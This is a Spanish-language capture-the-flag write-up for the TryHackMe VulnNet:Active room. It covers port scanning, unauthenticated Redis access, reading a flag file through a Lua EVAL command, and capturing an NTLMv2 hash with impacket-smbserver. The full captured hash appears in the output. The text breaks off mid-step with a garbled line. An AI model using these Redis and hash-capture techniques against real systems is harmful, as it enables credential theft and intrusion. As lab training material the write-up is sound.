## TryHackMe  <> VulnNet:Active

![image](https://github.com/Esevka/CTF/assets/139042999/c8b2b883-92a5-4ef7-9caf-9ef5029519b8)

Enlace Maquina: https://tryhackme.com/room/vulnnetactive

Enunciado : 

  - Obtener acceso completo al sistema y comprometer dominio.
  - Conseguir Flags
---

## Escaneo de puertos (NMAP).

-Buscamos puertos abiertos en en la maquina victima.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# nmap -p- -open -sS --min-rate 5000 -n -Pn -vvv 10.10.12.222 -oG open_ports                                                                              
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-20 06:32 CEST
    
    PORT      STATE SERVICE      REASON
    53/tcp    open  domain       syn-ack ttl 127
    135/tcp   open  msrpc        syn-ack ttl 127
    139/tcp   open  netbios-ssn  syn-ack ttl 127
    445/tcp   open  microsoft-ds syn-ack ttl 127
    464/tcp   open  kpasswd5     syn-ack ttl 127
    6379/tcp  open  redis        syn-ack ttl 127
    9389/tcp  open  adws         syn-ack ttl 127
    49665/tcp open  unknown      syn-ack ttl 127
    49668/tcp open  unknown      syn-ack ttl 127
    49669/tcp open  unknown      syn-ack ttl 127
    49670/tcp open  unknown      syn-ack ttl 127
    49684/tcp open  unknown      syn-ack ttl 127
    49698/tcp open  unknown      syn-ack ttl 127

  -Extraemos los puertos de la captura anterior para lanzarles unos scripts basicos de reconocimiento.

  Utilizamos un Script en bash simple pero de gran ayuda. Script-->  https://github.com/Esevka/CTF/tree/main/Bash

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# list_port open_ports              
    
    [+]Puertos Disponibles --> (Copiados en el Clipboard)
    
    53,135,139,445,464,6379,9389,49665,49668,49669,49670,49684,49698


  -Lanzamos scripts basicos de reconocimiento sobre los puertos abiertos.

    ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
    └─# nmap -p 53,135,139,445,464,6379,9389,49665,49668,49669,49670,49684,49698 -sCV -n -Pn 10.10.12.222 -vvv -oN info_ports
    
    PORT      STATE SERVICE       REASON          VERSION
    53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
    135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds? syn-ack ttl 127
    464/tcp   open  kpasswd5?     syn-ack ttl 127
    6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store 2.8.2402
    9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
    49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
    49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
---
## Analizamos la informacion obtenida sobre los puertos.

La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay un puerto que llama la atencion.

--Puerto 6379 (Redis)

      Que es Redis?
      
      Redis es una base de datos en memoria de código abierto y un almacén de datos de tipo clave-valor.
      
      Esto significa que los ejemplos de uso de Redis no se parecerán a las tablas de una base de datos relacional típica,
      sino que se centrarán en cómo almacenar y recuperar datos utilizando claves.
  
      Redis es eficiente en la gestión de datos clave-valor y es especialmente útil para almacenar datos temporales, configuraciones, caché 
      y en situaciones donde se requiere alta velocidad y baja latencia.

  Info--> Redis Pentesting[+] https://exploit-notes.hdks.org/exploit/database/redis-pentesting/
  
  1)  Conectamos a la BD sin credenciales a ver si podemos obtener algo.

          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/VulnNetActive/nmap]
          └─# redis-cli -h 10.10.12.222
          10.10.12.222:6379> 

  2)  Listamos el número de claves que continenen las bases de datos, no hay nada.
    
          10.10.12.222:6379[3]> info keyspace
          # Keyspace

  3)  Listamos todas las configuraciones y sus valores actuales.
  
          102) "no"
          103) "dir"
          104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"  ---> INTERESANTE
          105) "maxmemory-policy"
      
        De la linea 104 deducimos que --> enterprise-security <-- es un usuario local del sistema, por lo que ya tenemos un usuario del sistema.
      
          Info: Redis mediante el comando EVAL nos permite ejecutar scripts en Lua los cuales deben ser pasados como cadena(String).

  4)  Sabiendo esto podriamos leer la flag de usuario.(La ip cambia hemos tenido que reiniciar la maquina.)

          10.10.240.193:6379> Eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
          (error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near 
          '3eb176aee96---------0bc93580b291e'

  5)  Capturamos el Hash NTLM del usuario --> enterprise-security

      Este proceso lo podemos hacer montandonos nuestro servidor SMB con impacket-smbserver o utilizando la herramienta Responder.

          La unción principal de Responder es realizar ataques de captura de credenciales en redes locales.
          Responder se utiliza para interceptar y robar las credenciales de autenticación enviadas a través de protocolos como
          NTLMv1/v2, SMB, HTTP, FTP y otros, en un entorno de red local.

      - impacket-smbserver
    
          Montamos nuestro servidor smb

            ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/VulnNetActive]
            └─# impacket-smbserver -smb2support  share content
            Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
            
            [*] Config file parsed
            [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
            [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
            [*] Config file parsed
            [*] Config file parsed
            [*] Config file parsed
            [*] Incoming connection (10.10.106.15,49749)
            [*] AUTHENTICATE_MESSAGE (VULNNET\enterprise-security,VULNNET-BC3TCK1)
            [*] User VULNNET-BC3TCK1\enterprise-security authenticated successfully
            [*] enterprise-security::VULNNET:aaaaaaaaaaaaaaaa:48c1b2b4604ce440ed0e015a35ba0637:010100000000000000f0b4343204da019aad366cd8e34abd0000000001001000410062006a00640070007a006d00690003001000410062006a00640070007a006d0069000200100053005900530070004e004b004e0064000400100053005900530070004e004b004e0064000700080000f0b4343204da010600040002000000080030003000000000000000000000000030000033f377f1305a0c67c0f262ac98c1eefa29e74e04022ecd4c19842247eb7caafa0a001000000000000000000000000000000000000900200063006900660073002f00310030002e0039002e00390032002e003100350031000000000000000000
            [*] Closing down connection (10.10.106.15,49749)
            [*] Remaining connections []

          Ejecutamos `4f`c  xa 


        
    
  



    


    
    




  






  

  


